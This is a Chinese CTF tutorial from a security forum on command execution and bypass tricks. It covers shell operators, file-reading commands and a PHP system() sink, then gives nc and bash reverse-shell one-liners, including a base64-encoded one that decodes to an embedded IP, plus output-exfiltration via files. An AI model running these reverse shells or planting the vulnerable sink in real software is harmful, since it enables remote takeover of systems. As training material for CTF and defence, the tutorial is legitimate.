---
title: 保姆级命令执行总结
url: https://forum.butian.net/share/3667
source: 奇安信攻防社区
date: 2024-08-17
fetch_date: 2025-10-06T18:04:10.739173
---

# 保姆级命令执行总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 保姆级命令执行总结

* [CTF](https://forum.butian.net/topic/52)

详解命令执行绕过

保姆级命令执行总结
=========
ASCII码表完整版
----------
| ASCII值 | 控制字符 | ASCII值 | 控制字符 | ASCII值 | 控制字符 | ASCII值 | 控制字符 |
|---|---|---|---|---|---|---|---|
| 0 | NUT | 32 | (space) | 64 | @ | 96 | 、 |
| 1 | SOH | 33 | ! | 65 | A | 97 | a |
| 2 | STX | 34 | ” | 66 | B | 98 | b |
| 3 | ETX | 35 | \# | 67 | C | 99 | c |
| 4 | EOT | 36 | $ | 68 | D | 100 | d |
| 5 | ENQ | 37 | % | 69 | E | 101 | e |
| 6 | ACK | 38 | &amp; | 70 | F | 102 | f |
| 7 | BEL | 39 | , | 71 | G | 103 | g |
| 8 | BS | 40 | ( | 72 | H | 104 | h |
| 9 | HT | 41 | ) | 73 | I | 105 | i |
| 10 | LF | 42 | \\* | 74 | J | 106 | j |
| 11 | VT | 43 | + | 75 | K | 107 | k |
| 12 | FF | 44 | , | 76 | L | 108 | l |
| 13 | CR | 45 | - | 77 | M | 109 | m |
| 14 | SO | 46 | . | 78 | N | 110 | n |
| 15 | SI | 47 | / | 79 | O | 111 | o |
| 16 | DLE | 48 | 0 | 80 | P | 112 | p |
| 17 | DCI | 49 | 1 | 81 | Q | 113 | q |
| 18 | DC2 | 50 | 2 | 82 | R | 114 | r |
| 19 | DC3 | 51 | 3 | 83 | X | 115 | s |
| 20 | DC4 | 52 | 4 | 84 | T | 116 | t |
| 21 | NAK | 53 | 5 | 85 | U | 117 | u |
| 22 | SYN | 54 | 6 | 86 | V | 118 | v |
| 23 | TB | 55 | 7 | 87 | W | 119 | w |
| 24 | CAN | 56 | 8 | 88 | X | 120 | x |
| 25 | EM | 57 | 9 | 89 | Y | 121 | y |
| 26 | SUB | 58 | : | 90 | Z | 122 | z |
| 27 | ESC | 59 | ; | 91 | \[ | 123 | { |
| 28 | FS | 60 | &lt; | 92 | / | 124 | \| |
| 29 | GS | 61 | = | 93 | \] | 125 | } |
| 30 | RS | 62 | &gt; | 94 | ^ | 126 | ~ |
| 31 | US | 63 | ? | 95 | — | 127 | DEL |
系统命令简介
------
系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\\Windows\\System32，下面将针对linux和win的系统命令做简单介绍。
### 管道符
在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令
```php
windows：
‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
linux：
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同
```
### 通配符
在linux操作系统中支持如下两种通配符
```php
? 可代替任意一个字符
\* 可代替0-任意个字符
```
\*\*例\*\*
```php
若当前目录只存在一个名为flag的文件
cat flag <==> cat fla? <==> cat f\*
```
### 重定向
在linux操作系统中一共有&gt;和&gt;&gt;两个重定向符号
\*\*1.&gt;符号\*\*
用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。
```php
ls > file.txt //将ls的执行结果写入file.txt中
>file.txt //创建名为file.txt的文件
```
\*\*2.&gt;&gt;符号\*\*
将命令的标准输出重定向到指定的文件，但与`>` 不同的是，如果文件已经存在，`>>` 会将输出追加到文件末尾而不是覆盖文件内容。
```php
ls >> file.txt
```
### 常见系统命令
在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的
| system() |
|---|
| passthru() |
| exec() |
| shell\\_exec() |
| popen() |
| proc\\_open() |
| pcntl\\_exec() |
| `` |
python中的例如等
根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整
#### windows
| 命令 | 实际效果 |
|---|---|
| ipconfig | 主要用来查看当前机器内、外网ip |
| type | type filename 查看文件内容 |
| cd | 目录跳转 |
| ping | ping ip或者url 主要用来判断某机器是否可达 |
| dir | 列出当前目录 |
| whoami | 查看当前用户，主要用于判断是否可以命令执行 |
#### linux
\*\*基础命令\*\*
| 命令 | 实际效果 |
|---|---|
| ls | 列出当前目录 |
| cd | 目录跳转 |
| rm | 删除 |
| mv | 重命名 |
| whoami | 查看当前用户 |
| uname -a | 列出内核版本等详细系统讯息 |
| ifconfig | 查看当前机器内外网ip |
| ping | 判断目标机器是否可达 |
| touch | 创建文件 |
| mkdir | 创建目录 |
在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的\*\*文件读取命令\*\*
| 命令 | 实际效果 |
|---|---|
| cat | 文件读取 |
| tac | 文件读取（行倒序输出） |
| more | 文件读取（一页一页显示） |
| less | 文件读取（一页一页显示，可翻页） |
| head | 文件读取（显示头几行） |
| tail | 文件读取（显示最后几行） |
| nl | 文件读取（会输出行号） |
| vim/vi | 文本编辑器，可用于内容查看 |
| nano | 文本编辑器，可用于内容查看 |
| emacs | 文本编辑器，可用于内容查看 |
| sed -n '1,10p' | 文件读取（显示前10行） |
| rev | 文件读取（倒序输出） |
| base64 | 文件读取（以base64形式输出） |
| strings | 文件读取（提取文件中可输出的字符串） |
| xxd | 文件读取（二进制形式输出） |
| hexdump | 文件读取（16进制形式输出） |
| od | 文件读取（8进制形式输出） |
| uniq | 文件读取（会去掉重复行） |
| cp | 文件复制（可用于突破目标文件权限限制） |
#### 其它命令
除了以上的常见命令外还有其它的一些常用命令
##### \*\*find\*\*
常用于在linux系统中查找某文件（支持通配符）的具体位置
```php
find / -name flag
find / -name f\*
find / -name fla?
/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件
```
##### \*\*sed\*\*
在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的
```php
实现格式为：
sed -i '行数s/原内容/替换为的内容/' 文件名
sed -i '2s/x\.x\.x\.x/150.158.24.228/' filename
sed -i '3s/7002/7000/' filename
sed -i '4s/.\*//' filename
```
PS：
```php
1.该命令支持通配符
2.该命令对于特殊符号需要用\进行转义，如上述的例1中的.
```
##### \*\*echo\*\*
如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件
```php
实现格式为：
echo 'base64编码的数据' | base64 -d > filename
```
二、命令执行
------
### system类命令执行
所谓system类命令执行即是原题目已经给出system函数，且其参数是可控的这种情况，下面将以php为例着重讲解该情况下的命令执行方式以及绕过姿势
\*\*示例代码\*\*
```php
<?php
system($\_POST['1']);
?>
```
#### 无回显rce
在1.3节开篇我们提到了很多可执行系统命令的函数，他们都可以达成执行系统命令的目的，但其中的一些函数会不会将执行的结果回显，例如exec函数，此时我们就需要通过某些手法得到回显，下面将对这些手法进行详细讲解
##### 反弹shell
###### \*\*vps简介\*\*
作为一名合格的web手，一台vps是必不可少的，所谓vps就是一台具有公网ip的服务器，可从下面三方厂家获取
1.华为云：[https://www.huaweicloud.com/（云耀云服务器](https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8)）
2.腾讯云：[https://cloud.tencent.com/（轻量型服务器](https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8)）
3.阿里云：<https://www.aliyun.com/>
服务器和我们个人PC电脑最大的区别就是具有公网ip，实际效果就是任意用户皆可达我们的服务器（可ping通），而个人PC电脑绝大多数情况是无法实现该功能的。详细购买流程以及产品讯息可与对应客服探讨，成功购买后即可使用ssh（服务器自带的远程连接工具）或电脑自带的远程桌面功能进行服务器登录
\*\*1.ssh登录\*\*
ssh软件推荐termius
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-b30bd3bf366485ea1ed89184af638b1a59c7c23c.png)
从厂家获取账号密码以及公网ip后将其填入1，2，3处，然后点击4处即可远程连接到服务器
\*\*2.电脑自带远程桌面功能登录\*\*（常用于win系统）
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-913cbd7095188438d6955f0f57a6dac2d127a514.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-a3d74d7d30c3ab0796f989f2d05dc6887fdfae16.png)
在此界面输入公网ip，稍后再输入厂家给予的账号密码即可登录成功
###### 反弹手法
\*\*1.nc反弹\*\*
```php
正向连接：
linux靶机:nc -e /bin/bash -lvvnp 端口
win靶机:nc -e cmd -lvvnp 端口 //win系统不自带nc，需要手动上传，此处nc并非固定，根据实际上传的程序名做相应修改
攻击机:nc 靶机ip 端口
反向连接：
linux靶机:nc -e /bin/bash 攻击机ip 端口
win靶机:nc -e cmd 攻击机ip 端口
攻击机:nc -lvvnp 端口
//上述所有操作皆是带有-lvvnp的操作（端口监听）优先
```
\*\*2.bash反弹\*\*
```php
攻击机:nc -lvvnp 端口
靶机:bash -c "bash -i >& /dev/tcp/攻击机ip/攻击机监听的端口 0>&1"
数组版靶机（java源码）:bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx}|{base64,-d}|{bash,-i}
//使用时需要对命令中的编码部分解码，将其中的ip和端口修改为攻击机ip段端口后并重新编码才可使用，浏览器传参时需要url编码
```
示例演示
1.在靶机\*\*可达的机器（可ping通，如公网服务器或同网段机器）\*\*上监听端口
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-f5c166b1c5fcde0b4a80e183954f1fa9b49670a0.png)
2.在靶机上执行bash反弹命令
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-b7374741b7745e6c0f9027274866ea76659fc0d6.png)
3.查看刚刚监听端口的服务器
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-eeb7d3445b9a12d91c596fdd6a5fa4d8ed858ded.png)
可以发现反弹shell成功，此时可执行任意系统命令
\*\*3.写shell文件后执行\*\*
```php
创建shell.sh
bash -c "bash -i >& /dev/tcp/服务器ip/端口 0>&1"
将上述bash反弹命令写入文件，详见1.2.3节中的echo用法
./shell.sh
利用.执行shell.sh反弹shell
```
\*\*正向连接与反向连接简介\*\*
借用迪总一张图
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-deefca5a9b97d23b03926b8308b2d7e44545fb33.png)
PC1、PC2、PC3为我们的目标机器，此时不难发现三台靶机都处于内网环境
正向连接：攻击机主动连接靶机
反向连接：靶机主动连接攻击机
准则：谁被动，谁监听
在上述环境中，有且仅有\*\*可访问路由\*\*、\*\*linux外网服务器\*\*、\*\*windows服务器\*\*这三个ip是可访问的，而我们的三台PC靶机此时处于内网环境，相当于我们的个人PC电脑，此时是无法访问的，我们的外网服务器最多只可致\*\*可访问路由\*\*处，即攻击机无法主动连接到靶机，所以此时就无法正向连接。由于我们外网服务器皆为\*\*公网服务器\*\*，所以三台PC靶机是可以访问到服务器的，即可以进行反向连接，让靶机主动连接攻击机，也就是我上面演示的bash反弹的操作。
##### 数据写出
将命令的执行结果写入其他文件，再访问其他文件获取执行结果，下以1.txt为例
```php
利用cp命令：cp flag.php 1.txt
利用mv命令：mv flag.php 1.txt
利用>输出结果到文件：ls > 1.txt
利用tee命令：ls | tee 1.txt ...